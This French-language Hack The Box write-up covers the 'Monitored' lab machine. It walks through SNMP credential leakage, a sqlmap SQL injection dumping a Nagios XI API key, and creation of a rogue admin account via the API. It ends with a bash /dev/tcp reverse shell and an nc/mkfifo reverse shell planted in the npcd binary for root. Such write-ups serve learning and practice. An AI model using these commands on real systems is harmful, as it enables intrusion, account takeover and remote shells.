---
date: 2024-05-09T21:41:07-05:00
# description: ""
image: "/images/HTB-Monitored/Monitored.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Monitored"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Monitored](https://app.hackthebox.com/machines/Monitored)
* Niveau: Moyen
* OS: Linux
---

Monitored met l'accent sur une énumération rigoureuse, le challenge commence avec un formulaire de connexion pour Nagios XI et l'énumération des répertoires mène à la découverte de plus en plus de points de terminaison. Après avoir exploité toutes les pistes de notre scan TCP, nous utilisons un scan UDP pour trouver un service exploitable qui conduit à une fuite d'identifiants que nous utilisons pour nous connecter. Nous découvrons la version du logiciel sur la cible et utilisons le `CVE-2023-40931` pour ajouter un nouveau compte administrateur à l'instance de Nagios XI afin de nous accorder l'accès. En exécutant une commande (reverse shell) dans Nagios XI, un accès initial est établi et en manipulant certains services, nous escaladons nos privilèges pour pour accéder au compte root. 

Adresse IP cible - `10.10.11.248`

## Scanning

```
nmap -sC -sV -oA nmap/Monitored 10.10.11.248
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 11:55 CDT
Nmap scan report for 10.10.11.248
Host is up (0.051s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp  open  http     Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.69 seconds
```

Quatre ports ouverts sont détectés, 22 (SSH), 80 (HTTP avec Apache), 389 (LDAP), 443 (HTTPS). Nous sommes également redirigés vers `nagios.monitored.htb/`.

```
sudo echo "10.10.11.248 monitored.htb nagios.monitored.htb" | sudo tee -a /etc/hosts
```

## Enumération

Nous trouvons une page de login Nagios XI après avoir cliqué sur `Access Nagios XI` lorsque nous visitons `https://nagios.monitored.htb/`

![Nagios XI](/images/HTB-Monitored/Nagios-XI.png)

L'url de cette page est `https://nagios.monitored.htb/nagiosxi/login.php`. Nous n'avons pas les identifiants pour nous connecter pour le moment.

![Nagios-login-XI](/images/HTB-Monitored/Nagios-XI-login.png)

> Nagios est un **outil open source de surveillance des systèmes informatiques**. Il a été conçu pour fonctionner sur le système d'exploitation Linux et peut surveiller des appareils fonctionnant sous Linux, Windows et Unix.

Nous pouvons faire une énumération de répertoires avec ffuf. Commençons par `https://nagios.monitored.htb/`.

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100 -fc 404 -e .php,.html,.txt -u https://nagios.monitored.htb/FUZZ -ic
```

![Subdomain fuzzing](/images/HTB-Monitored/fuzz.png)

Nous trouvons un point de terminaison `/nagios` et la visite de `https://nagios.monitored.htb/nagios` nous invite à nous connecter, mais nous n'avons pas d'informations d'identification à ce stade.

![Second Nagios Login form](/images/HTB-Monitored/nagios-login.png)

Ensuite, nous examinons `https://nagios.monitored.htb/nagiosxi/` et plusieurs résultats sont obtenus.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://nagios.monitored.htb/nagiosxi/FUZZ' -e .php,.html,.txt -ic -fc 404 -c
```

![Ffuf directory enumeration](/images/HTB-Monitored/ffuf.png)

* La plupart de ces points de terminaison redirigent vers la page de connexion, probablement parce que nous devons être authentifiés pour y accéder. 

* `/images` et `/api` renvoient `Forbidden`.

![Forbidden page](/images/HTB-Monitored/forbidden.png)

* `/terminal` présente une page intitulée `Shell In A Box` où nous avons accès à un terminal dans le navigateur pour nous connecter.

![Nagios XI terminal endpoint](/images/HTB-Monitored/terminal.png)

En allant plus en profondeur, `/images` révèle davantage de résultats, mais nous n'avons pas les permissions pour y accéder.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'https://nagios.monitored.htb/nagiosxi/images/FUZZ' -ic -c
```
![Images endpoint enumeration](/images/HTB-Monitored/images-fuzz.png)

![Images endpoint enumeration - Renewal](/images/HTB-Monitored/renewals.png)

En faisant la même chose pour `/api`, nous trouvons `/includes` et `/v1`.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u 'https://nagios.monitored.htb/nagiosxi/api/FUZZ' -ic -c
```

![api endpoint enumeration](/images/HTB-Monitored/api.png)

`includes` ne donne rien d'utile mais `v1` renvoie quelques résultats intéressants.

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -fc 404 -u 'https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ' -ic -fs 32 -fc 403
```
![api endpoint enumeration - v1](/images/HTB-Monitored/v1-fuzz.png)

`license` et `autheticate` renvoient tous deux des erreurs.

![api endpoint enumeration - v1 - license](/images/HTB-Monitored/license.png)

![api endpoint enumeration - v1 - authenticate](/images/HTB-Monitored/authenticate.png)

À ce stade, nous avons énuméré tous les éléments découverts. Pour le moment, nous avons trouvé:

* Trois pages de connexion:
	* https://nagios.monitored.htb/nagiosxi/
	* https://nagios.monitored.htb/nagiosxi/terminal
	* https://nagios.monitored.htb/nagios

* Un point de terminaison d'authentification à l'adresse https://nagios.monitored.htb/nagiosxi/api/v1/authenticate

Il apparaît clairement que nous avons besoin d'informations d'identification pour accéder au système cible.

> Bien que les scans UDP soient rarement nécessaires dans les CTF, nous nous devons d'être aussi minutieux que possible dans notre reconnaissance. Je suis resté bloqué pendant longtemps après avoir omis d'utiliser un scan UDP.

Lançons un scan UDP.

```
sudo nmap -sU -sC -sV -vv 10.10.11.248
```
> Il est normal pour les scans UDP de prendre beaucoup de temps, ils sont généralement plus lents. 

![nmap UDP scan](/images/HTB-Monitored/udp-scan.png)

Quatre ports seront découverts:
* 68 - DHCP
* 123 - NTP
* 161 - SNMPv1
* 162 - SNMPv3

Essayons d'exploiter SNMP. Nous pouvons utiliser `snmpwalk` pour énumérer le service. Notons que deux versions de SNMP sont utilisées ici, nous spécifierons `SNMP V1` car elle est moins sécurisée.

> La commande ci-dessous génère beaucoup de données sur le terminal, il est donc préférable de l'envoyer dans un fichier.

```
snmpwalk -c public -v1 -t 10 10.10.11.248 > snmp.txt
```

En examinant le contenu du fichier, nous trouvons quelques lignes faisant référence à un script `/opt/scripts/check_host.sh` avec ce qui semble être des informations d'identification `svc:XjH7VCehowpR1xZB`.

![SNMP potential credentials](/images/HTB-Monitored/creds-snmp.png)

Les identifiants ne fonctionnent pas sur `https://nagios.monitored.htb/nagiosxi/terminal/` et nous constatons que ce compte utilisateur est soit désactivé, soit inexistant sur `https://nagios.monitored.htb/nagiosxi/login.php`. 

![NagiosXI login attempt failed](/images/HTB-Monitored/nagiosxi-login-attempt.png)

## Accès Initial

Sur `https://nagios.monitored.htb/nagios`, nous pouvons nous connecter. La page affiche un PID et la version du logiciel. Essayer de réutiliser le cookie de cette page sur `/nagiosxi` échoue également.

![NagiosXI login attempt successful](/images/HTB-Monitored/nagios-core.png)

En recherchant les vulnérabilités pour cette version spécifique du logiciel, nous trouvons [trois CVE](https://outpost24.com/blog/nagios-xi-vulnerabilities/). Ces vulnérabilités permettent à des utilisateurs disposant de différents niveaux de privilèges d'accéder à des champs de la base de données par le biais d'injections SQL.

![NagiosXI vulnerabilities](/images/HTB-Monitored/nagios-vulns.png)

![CVE-2023-40931-EXPLAINED](/images/HTB-Monitored/CVE-2023-40931-EXPLAINED.png)

Rappelons que sur `/api/v1/authenticate` nous avons vu le message `Vous ne pouvez utiliser POST qu'avec authenticate.`

1. Nous envoyons une requête POST à ce point de terminaison avec les informations d'identification de l'utilisateur et nous recevons un token 

```
curl -k -L -X POST "https://nagios.monitored.htb/nagiosxi/api/v1/authenticate" -d "username=svc&password=XjH7VCehowpR1xZB"
```

![Token retrieval](/images/HTB-Monitored/token-retrieval.png)

2. Nous utilisons ce token pour lancer une injection SQL

```
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=895ab920b8c2b4196e16ee5c4f6c4470fbd77bae" -p id --level 5 --risk 3 --dump 
```

Lorsque le message `GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]` apparaît entrez `N`.

![SQLmap command](/images/HTB-Monitored/sqlmap.png)

SQLmap commencera à extraire toutes les tables de la base de données mais nous pouvons inspecter les tables qui nous intéressent en allant dans `/home/<Votre_nom_d'utilisateur>/.local/share/sqlmap/output/nagios.monitored.htb/dump/`. Nous savons que la vulnérabilité est liée aux tables `xi_session` et `xi_users`.

![SQLmap tables dump](/images/HTB-Monitored/tables-dumped.png)

Vous pouvez aussi défiler sur le terminal et trouver le dump de la table `xi_users`. Nous trouvons la clé API pour l'utilisateur `Nagios Administrator` `IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`.

![API key found](/images/HTB-Monitored/API-key.png)

> Des hashs de mots de passe sont également présents dans le dump mais nous ne sommes pas en mesure de les craquer.

Nous n'avons toujours pas d'identifiants valides pour nous connecter à Nagios XI et il n'y a aucun moyen de s'inscrire. Notre seule option est de trouver comment ajouter un nouveau compte.

Après quelques recherches, nous trouvons comment ajouter de nouveaux utilisateurs via l'API [ici](https://support.nagios.com/forum/viewtopic.php?t=42923) et sur cette [page](https://support.nagios.com/forum/viewtopic.php?f=6&t=40502) nous apprenons également comment ajouter un compte administrateur en utilisant le paramètre `auth_level`.

![NagiosXI add users via API](/images/HTB-Monitored/nagiosxi-api.png)

La commande ci-dessous est utilisée pour créer un nouvel utilisateur admin.  Les champs `username`, `email`, `name`, et `password` sont obligatoires.

```
curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=adminsec&password=password123&name=kscorpio&email=kscorpio@monitored.htb&auth_level=admin"
```

![User added via API successfully](/images/HTB-Monitored/user-created.png)

Avec le compte nouvellement créé, nous pouvons nous connecter à Nagios XI à l'adresse `https://nagios.monitored.htb/nagiosxi/`.

> Il vous sera demandé de changer le mot de passe après votre connexion.

![NagiosXI login success](/images/HTB-Monitored/nagiosxi-login.png)

Sur le tableau de bord, survolez le menu `Configure` et sélectionnez `Core Config Manager`.

![NagiosXI config](/images/HTB-Monitored/nagiosxi-config.png)

Sélectionnez `Commandes` et ensuite `Add New`.

![Core Config Manager](/images/HTB-Monitored/config-cmd.png)

![Add new command](/images/HTB-Monitored/new-cmd.png)

Ajoutez une commande reverse shell et sauvegardez-la.  Par exemple: `bash -c 'bash -i >& /dev/tcp/<IP_Address>/<Port> 0>&1'`.

![Reverse shell command](/images/HTB-Monitored/rev-shell-cmd.png)

Vous devez également cliquer sur `Apply Configuration` pour que la nouvelle commande soit listée. Vous devriez maintenant voir `149 Commands`.

![Apply configuration](/images/HTB-Monitored/apply-config.png)

Démarrons un listener sur le port spécifié dans notre commande.

Pour lancer la commande, allez dans `Monitoring` > `Hosts` > cliquez sur `localhost`.

![Configuration - localhost](/images/HTB-Monitored/localhost.png)

Sous `Check command`, sélectionnez votre commande et cliquez sur `Run Check Command` et vous obtiendrez une connexion sur votre listener.

![Initial Foothold](/images/HTB-Monitored/nagios-shell.png)

Le premier flag est accessible à `/home/nagios/user.txt`.

![User flag](/images/HTB-Monitored/user-flag.png)

## Elévation de Privilèges

En exécutant `sudo -l` nous découvrons que l'utilisateur peut manipuler deux services `nagios` et `npcd` en plus de pouvoir exécuter divers scripts.

![sudo -l command](/images/HTB-Monitored/sudo-l.png)

En utilisant la commande `find`, nous obtenons les emplacements exacts de `nagios` et de `npcd`.

```
find / -name nagios 2> /dev/null

find / -name npcd 2> /dev/null
```

![services locations](/images/HTB-Monitored/services-location.png)

Nous vérifions également les permissions des binaires et nous notons que nous avons les permissions d'écriture pour `npcd`. Nous pouvons éditer le contenu du fichier et le remplacer par une commande malveillante pour obtenir un shell.

![Binaries permissions](/images/HTB-Monitored/binaries-perms.png)

1. Stopper le service

```
sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
```

2. Editer `npcd`

```
echo '#!/bin/bash' > /usr/local/nagios/bin/npcd

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.4 5555 >/tmp/f' >> /usr/local/nagios/bin/npcd
```

3. Démarrez un listener et démarrez le service `npcd` à l'aide du script

```
sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
```

Nous obtenons un shell root sur notre listener et nous pouvons lire le drapeau root dans `/root/root.txt`.

![Root flag](/images/HTB-Monitored/root-flag.png)

J'espère que cet article vous a été utile! Si vous avez des questions, vous pouvez me contacter sur Twitter à [_KScorpio](https://twitter.com/_KScorpio).
